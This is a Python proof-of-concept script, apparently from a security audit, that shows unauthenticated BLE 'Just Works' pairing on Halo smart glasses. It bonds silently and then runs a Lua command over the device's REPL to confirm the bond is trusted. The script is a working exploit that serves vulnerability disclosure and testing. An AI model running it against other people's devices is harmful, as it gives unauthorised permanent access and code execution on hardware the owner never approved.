# /// script
# requires-python = ">=3.10,<3.14"
# dependencies = ["bleak>=0.22", "brilliant-ble>=3.1.1,<4"]
# ///
"""
S-0001 PoC: silently bond with a Halo during its pairing window (or out-of-box).

Proves pairing is unauthenticated (SC Just Works, NoInputNoOutput): any host in
range can acquire a permanent bond with zero user verification on either side.

Usage:
    uv run silent_bond.py --name "Halo"     # name prefix; default scans for "Halo"

    1. Start script.
    2. When prompted, hold the Halo button 5 s (pairing window), OR use
       factory-new glasses (zero bonds = always pairable).
    3. VULNERABLE  -> bond acquired + REPL ping succeeds
       PROTECTED   -> pairing rejected / passkey demanded
"""
import argparse
import asyncio
import sys

from bleak import BleakClient, BleakScanner


async def find_halo(prefix: str, timeout: float = 30.0):
    print(f"[*] Scanning for BLE name starting with {prefix!r} (up to {timeout:.0f}s)...")

    def match(device, adv):
        return adv.local_name and adv.local_name.startswith(prefix)

    device = await BleakScanner.find_device_by_filter(match, timeout=timeout)
    if not device:
        print("[-] No Halo found. Make sure it is powered and advertising.")
        sys.exit(2)
    print(f"[+] Found {device.address} name={device.name!r}")
    return device


async def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--name", default="Halo", help="BLE name prefix of the glasses")
    args = ap.parse_args()

    device = await find_halo(args.name)

    print("[*] Hold the Halo button for 5 s (pairing window open, pairing LED)...")
    print("    (factory-new / zero-bond glasses are pairable without the button)")

    async with BleakClient(device) as client:
        print("[+] Connected")
        try:
            # BlueZ Pair(): initiates SMP. With Halo's NoInputNoOutput, this
            # completes Just Works: no prompt, no number, nothing to confirm.
            paired = await client.pair(protection_level=2)
            print("[+] Pairing procedure returned:", paired)
        except Exception as e:
            print(f"[+] Pairing rejected or requires input: {e}")
            print("[OK] PAIRING PROTECTED — S-0001 not reproducible")
            sys.exit(0)

    # Prove the bond is trusted: reconnect (fresh link) and ping the Lua REPL.
    print("[*] Reconnecting; verifying privileged GATT (Lua REPL)...")
    try:
        from brilliant_ble import BrilliantBle

        halo = BrilliantBle()
        await halo.connect(name=device.name)
        await halo.send_break_signal()
        responses = []
        halo._user_print_response_handler = responses.append
        await halo.send_lua("print('fw ' .. frame.FIRMWARE_VERSION)", await_print=True)
        await halo.send_reset_signal()  # leave main.lua running
        print(f"[+] Link encrypted; REPL ping: {responses}")
        print("[VULNERABLE] Unauthenticated bond acquired; this host is trusted permanently")
        sys.exit(1)
    except SystemExit:
        raise
    except Exception as e:
        print(f"[!] Bonded but REPL check inconclusive: {e}")
        sys.exit(1)


if __name__ == "__main__":
    asyncio.run(main())
